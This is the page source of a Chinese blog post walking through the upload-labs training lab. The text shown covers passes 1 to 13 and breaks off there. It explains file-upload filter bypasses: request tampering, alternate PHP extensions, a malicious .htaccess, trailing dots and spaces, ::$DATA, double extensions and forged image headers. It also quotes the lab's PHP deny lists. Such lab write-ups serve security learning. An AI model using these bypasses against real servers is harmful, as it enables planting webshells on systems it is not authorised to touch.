@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        upload-labs（文件上传）总结 - 一筐萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 你若盛开，清风自来！ </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>一筐萝卜</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-01"><span class="toc-text">pass-01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-02"><span class="toc-text">pass-02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-03"><span class="toc-text">pass-03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-04"><span class="toc-text">pass-04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-05"><span class="toc-text">pass-05</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-06"><span class="toc-text">pass-06</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-07"><span class="toc-text">pass-07</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-08"><span class="toc-text">pass-08</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-09"><span class="toc-text">pass-09</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-10"><span class="toc-text">pass-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-11"><span class="toc-text">pass-11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-12"><span class="toc-text">pass-12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-13"><span class="toc-text">pass-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-14"><span class="toc-text">pass-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-15"><span class="toc-text">pass-15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-16"><span class="toc-text">pass-16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-17"><span class="toc-text">pass-17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-18"><span class="toc-text">pass-18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-19"><span class="toc-text">pass-19</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-20"><span class="toc-text">pass-20</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        upload-labs（文件上传）总结
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-03-20 15:42:53</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#OWASP-TOP-10" title="OWASP-TOP-10">OWASP-TOP-10</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content no-indent">
+        <p>由于个人原因，需要重新看一个web的基本漏洞，所以抽时间重新过一遍</p>
+<a id="more"></a>
+
+<h3 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h3><p>首先上传一个php文件，发现提示</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该文件不允许上传，请上传<span class="string">.jpg</span>|<span class="string">.png</span>|<span class="string">.gif</span>类型的文件,当前文件类型为：<span class="string">.php</span></span><br></pre></td></tr></table></figure>
+
+<p>查看源代码发现检测文件类型的是js代码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="actionscript">            alert(<span class="string">"请选择要上传的文件!"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="comment">//定义允许上传的文件类型</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//提取上传文件的类型</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//判断上传文件类型是否允许上传</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span></span><br><span class="line">            alert(errMsg);</span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>要绕过js代码的方法很简单，js验证实在发送到服务器端之前而验证的，那么我们就可以在此之前做点手脚</p>
+<p>首先我们将一句话木马写进去一个php文件，把后缀改成“.jpg”，然后上传文件，用BurpSuite抓住这个数据包</p>
+<p><img src="https://s2.ax1x.com/2019/03/20/AK2jYQ.png" alt><br>把这个数据包发送到Repeater模块，在这里将文件名muma.jpg改成muma.php，然后go（发送数据包）<br><img src="https://s2.ax1x.com/2019/03/20/AKR8te.png" alt><br>发现已经成功的传到了服务器端<br><img src="https://s2.ax1x.com/2019/03/20/AKR5AU.png" alt> </p>
+<h3 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h3><p>同样先上传一个php文件，发现页面返回：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提示：文件类型不正确，请重新上传！</span><br></pre></td></tr></table></figure>
+
+<p>在http数据包中，判断文件类型的是Content-Type字段的值</p>
+<p>同样抓包，修改Content-Type为image/jpeg<br><img src="https://s2.ax1x.com/2019/03/20/AKWMgs.png" alt><br>成功上传到服务器上去</p>
+<h3 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h3><p>上传php文件提示：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提示：不允许上传<span class="selector-class">.asp</span>,<span class="selector-class">.aspx</span>,<span class="selector-class">.php</span>,.jsp后缀文件！</span><br></pre></td></tr></table></figure>
+
+<p>发现这一关是利用了黑名单限制，那么我们试一下php的别名，如php2、php3、php5、phtml、pht等</p>
+<p>一开始我上传了一个php3的文件，虽然成功上传上去了，但是去访问的时候没有解析成php</p>
+<p>查资料发现需要修改httpd.conf：（把前面的#去掉）</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php <span class="selector-class">.php</span> <span class="selector-class">.phtml</span> <span class="selector-class">.php3</span> <span class="selector-class">.php4</span> <span class="selector-class">.php5</span> .php2</span><br></pre></td></tr></table></figure>
+
+<p>然后再次访问刚刚上传的php3文件，发现成功解析<br>（上传后的文件路径页面上有返回）</p>
+<h3 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h3><p>根据提示我们可以看出，这一关的黑名单已经限制的很全了，几乎包含了所有php类似的后缀，但是没有限制“.htaccess”</p>
+<blockquote>
+<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。</p>
+</blockquote>
+<p>也就是说，我们将需要的配置写进一个”.htaccess”文件里，然后上传到服务器</p>
+<p>在这里我们可以在”.htaccess”写进去：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch "jpeg"&gt;</span></span><br><span class="line"> <span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这三句话的意思就是把本目录下的jpeg文件当做php来解析</p>
+<p>新建一个内容为下面的jpeg文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>上传到服务器上之后访问这个文件，可以看到该文件成功的被当做php文件来解析了<br><img src="https://s2.ax1x.com/2019/03/20/AKWyVK.png" alt> </p>
+<h3 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h3><p>本关黑名单把”.htaccess”也给限制了。<br>经过尝试发现大小写可以绕过</p>
+<p>可以将php文件名后缀改成Php、pHp、phP等都可以绕过<br><img src="https://s2.ax1x.com/2019/03/20/AKfYLt.png" alt> </p>
+<h3 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h3><p>查看提示发现同样是黑名店限制，几乎涵盖了所有危险的后缀，那么查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现没有去除文件名前后的空格，我们可以在文件名字后面加一个空格，绕过黑名单检测<br><img src="https://s2.ax1x.com/2019/03/20/AKhSld.png" alt> </p>
+<h3 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过查看源码发现，本关少了去除文件名最后的点的操作，要想利用到这一点，我们必须知道windows操作系统的一个特性</p>
+<blockquote>
+<p>在windows操作系统中，会自动去掉后缀名中的“.”（可以尝试一下）</p>
+</blockquote>
+<p>在文件名后面加上一个点，成功上传文件<br><img src="https://s2.ax1x.com/2019/03/20/AKhUXR.png" alt> </p>
+<h3 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h3><p>本关还是通过利用windows操作系统的一个特性<br><img src="https://s2.ax1x.com/2019/03/20/AK44M9.png" alt><br>在文件名后面加上”::$DATA”，成功上传文件<br><img src="https://s2.ax1x.com/2019/03/20/AK7Pmj.png" alt> </p>
+<h3 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过查看源码，按照源码上对文件名的操作我们可以做出相对应的文件名，经过测试我们可以在文件名后面加上“. .”（点+空格+点）</p>
+<p><img src="https://s2.ax1x.com/2019/03/20/AK70HA.png" alt> </p>
+<h3 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h3><p>查看提示发现，本关会去除这些字符，那么就想到了双写绕过</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本pass会从文件名中去除.php|<span class="type">.php5</span>|<span class="type">.php4</span>|<span class="type">.php3</span>|<span class="type">.php2</span>|<span class="type">php1</span>|<span class="type">.html</span>|<span class="type">.htm</span>|<span class="type">.phtml</span>|<span class="type">.pHp</span>|<span class="type">.pHp5</span>|<span class="type">.pHp4</span>|<span class="type">.pHp3</span>|<span class="type">.pHp2</span>|<span class="type">pHp1</span>|<span class="type">.Html</span>|<span class="type">.Htm</span>|<span class="type">.pHtml</span>|<span class="type">.jsp</span>|<span class="type">.jspa</span>|<span class="type">.jspx</span>|<span class="type">.jsw</span>|<span class="type">.jsv</span>|<span class="type">.jspf</span>|<span class="type">.jtml</span>|<span class="type">.jSp</span>|<span class="type">.jSpx</span>|<span class="type">.jSpa</span>|<span class="type">.jSw</span>|<span class="type">.jSv</span>|<span class="type">.jSpf</span>|<span class="type">.jHtml</span>|<span class="type">.asp</span>|<span class="type">.aspx</span>|<span class="type">.asa</span>|<span class="type">.asax</span>|<span class="type">.ascx</span>|<span class="type">.ashx</span>|<span class="type">.asmx</span>|<span class="type">.cer</span>|<span class="type">.aSp</span>|<span class="type">.aSpx</span>|<span class="type">.aSa</span>|<span class="type">.aSax</span>|<span class="type">.aScx</span>|<span class="type">.aShx</span>|<span class="type">.aSmx</span>|<span class="type">.cEr</span>|<span class="type">.sWf</span>|<span class="type">.swf</span>|<span class="type">.htaccess</span>字符！</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/03/20/AKHEbd.png" alt> </p>
+<h3 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h3><p>提示上传路径可控，那么我们就可以考虑一下00截断，在实验的机器php版本不符合，所以没有成功上传上去。</p>
+<h3 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h3><p>同pass-11，GET改成了POST</p>
+<h3 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h3><p>要求上传一个图片马，提示上说只检测前两个字节，那么我们可以伪造一下文件头</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">常用文件头：</span><br><span class="line">（1） <span class="selector-class">.JPEG</span>;<span class="selector-class">.JPE</span>;<span class="selector-class">.JPG</span>，”<span class="selector-tag">JPGGraphic</span> <span class="selector-tag">File</span>”</span><br><span class="line">（2） <span class="selector-class">.gif</span>，”<span class="selector-tag">GIF</span> 89<span class="selector-tag">A</span>”</span><br><span class="line">（3） <span class="selector-class">.zip</span>，”<span class="selector-tag">Zip</span> <span class="selector-tag">Compressed</span>”</span><br><span class="line">（4） <span class="selector-class">.doc</span>;<span class="selector-class">.xls</span>;<span class="selector-class">.xlt</span>;<span class="selector-class">.ppt</span>;<span class="selector-class">.apr</span>，”<span class="selector-tag">MS</span> <span class="selector-tag">Compound</span> <span class="selector-tag">Document</span> <span class="selector-tag">v1</span> <span class="selector-tag">or</span> <span class="selector-tag">Lotus</span> <span class="selector-tag">Approach</span> <span class="selector-tag">APRfile</span>”</span><br></pre></td></tr></table></figure>
